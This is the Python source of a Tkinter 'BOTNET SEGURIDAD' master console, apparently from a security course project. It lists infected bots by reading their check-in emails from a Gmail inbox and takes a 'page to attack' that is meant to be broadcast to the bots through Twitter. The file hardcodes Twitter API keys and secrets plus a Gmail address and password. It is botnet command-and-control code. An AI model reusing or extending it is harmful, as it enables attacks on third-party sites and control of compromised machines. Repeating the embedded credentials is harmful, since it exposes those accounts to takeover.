from Tkinter import *
from tkFileDialog   import askopenfilename
import os
import commands
import time
from threading import Thread
import tweepy

import poplib
import getpass
import email
from email.parser import Parser

#////////////////////TWIITER INFO/////////////////////////////////////////////////////////////
#Twitter API credentials
_CONSUMER_KEY = "3ncn0B0h8rLQWXQXTOFRYUIyX"
_CONSUMER_SECRET = "NhxmLrk5Upz9te7zXEgbBcjAPJeNCVxMZzad7VbfQznHxhHsno"
_ACCESS_KEY = "936178099078750208-Ru6DwsYwl3vZ68LVhU3AoFnJtsFK4eK"
_ACCESS_SECRET = "SdvMznJrj4zLeWV2BXboetwh2e7iA44XkshUBd4lvOwwV"


AUTH = tweepy.OAuthHandler(_CONSUMER_KEY, _CONSUMER_SECRET)
AUTH.set_access_token(_ACCESS_KEY, _ACCESS_SECRET)
AUTH.secure = True
API = tweepy.API(AUTH)

#UPDATE STATUS
SEARCH_TEXT = "#FFFJJJGGG69jeje"
SEARCH_NUMBER = 2
SEARCH_RESULT = API.search(SEARCH_TEXT, rpp=SEARCH_NUMBER)

#//////////////////////////////////////////////////////////////////////////////////////////////


def NewFile():
    print "New File!"
def OpenFile():
    name = askopenfilename()
    print name
def About():
    print "This is a simple example of a menu"
    
def listar(event):
    print("Listar bots")

def iniciar(event):
    print("Iniciar") 
    abrirventana3()
    
def quit(event):                           
    print("Saliendo del programa...") 
    import sys; sys.exit() 

def abrirventana3():
    win=Tk()
    win.geometry('500x300+700+100')
    fields = ('Pagina a atacar',)
    ents = makeform(win, fields)
    botonx = Button(win, text='Enviar',command=(lambda e=ents: compro_texto(e)))
    botonx.pack(fill=BOTH)
    botony= Button(win, text="Cerrar ventana")
    botony.pack(fill=BOTH)
    botony.bind('<Button-1>', quit)
def envioTweet(texto):
    print ("Se enviara un Tweet con la informacion de la siguiente pagina: "+texto)

def makeform(root, fields):
   entries = {}
   for field in fields:
      row = Frame(root)
      lab = Label(row, width=22, text=field+": ", anchor='w')
      ent = Entry(row)
      row.pack(side=TOP, fill=X, padx=5, pady=5)
      lab.pack(side=LEFT)
      ent.pack(side=RIGHT, expand=YES, fill=X)
      entries[field] = ent
   return entries
def compro_texto(entries):
   texto = (entries['Pagina a atacar'].get())
   print("Pagina:", texto)
   envioTweet(texto)


def listar_bots(event):

    #Codigo que se ejecuta en el master en la funcion listar_bots cuando sea necesario saber el
    #numero de bots activos. El master entra en su cuenta gmail y revisa los correos de los bots.
    linea="----------------------------------------------------------------------------------------------------"
    ast="****************************************************************************************************"

    li = list()
    contador = 0
    len_max = 50
    #Accedemos a la cuenta de gmail del master
    m = poplib.POP3_SSL('pop.gmail.com',995)
    m.user('telecofather@gmail.com')
    m.pass_('seguridadevigo')
    numero = len(m.list()[1]) #numero de mensajes sin leer en la bandeja de entrada

    for i in range(numero):
        # Se lee el mensaje
        response, headerLines, bytes = m.retr(i+1)
        # Se mete todo el mensaje en un unico string
        mensaje='\n'.join(headerLines)
        # Se parsea el mensaje
        p = Parser()
        email = p.parsestr(mensaje)
        # Guardamos el campo "from" para despues comprobar que los correos son de los bots
        remitente = email["From"]
        if remitente == "telecobot@gmail.com":
            contador = contador + 1 #Si los correos son de bots, aumentamos contador y
                                    #guardamos el "asunto" ya que contiene el nombre y MAC del equipo
            li.append(linea)
            li.append(email["Subject"])
    li.append(linea)
    li.append(ast)
    li.append(str(contador) + " BOTS ACTIVOS")
    li.append(ast) #lista con todos los bots separados con guiones y asteriscos
    m.quit() # Cierre de la conexion, importante para que los correos queden "leidos"
    root = Tk() # Creamos la ventana de fondo
    root.title("Bots activos")                     
    root.geometry('500x300+700+100')
    listb = Listbox(root, width = len_max)           # Creamos un Widgets Listbox
    for item in li:                 # Insertamos los valores de la lista en el Listbox
        listb.insert(0,item)

    listb.pack()                    # Hacemos el pack del widget
    root.mainloop()                 # Ejecutamos el bucle



#/////////////////INTERFAZ GRAFICA//////////////////////////////////////////////////////////////////////
root = Tk()
root.geometry('500x300+150+100')
root.title("BOTNET SEGURIDAD")
root.configure(background="grey")
w = Label(root, text="MENU PRINCIPAL", bg="blue", fg="white")
w.pack(fill=X)
boton1 = Button(None, text='Listar BOTS')
boton1.pack(fill=BOTH)
boton1.bind('<Button-1>', listar_bots)
boton2 = Button(None, text='INICIAR')
boton2.pack(fill=BOTH)
boton2.bind('<Button-1>', iniciar)
boton3 = Button(None, text='Salir')
boton3.pack(fill=BOTH)
boton3.bind('<Button-1>', quit)
mainloop()

#///////////////////////////////////////////////////////////////////////////////////////
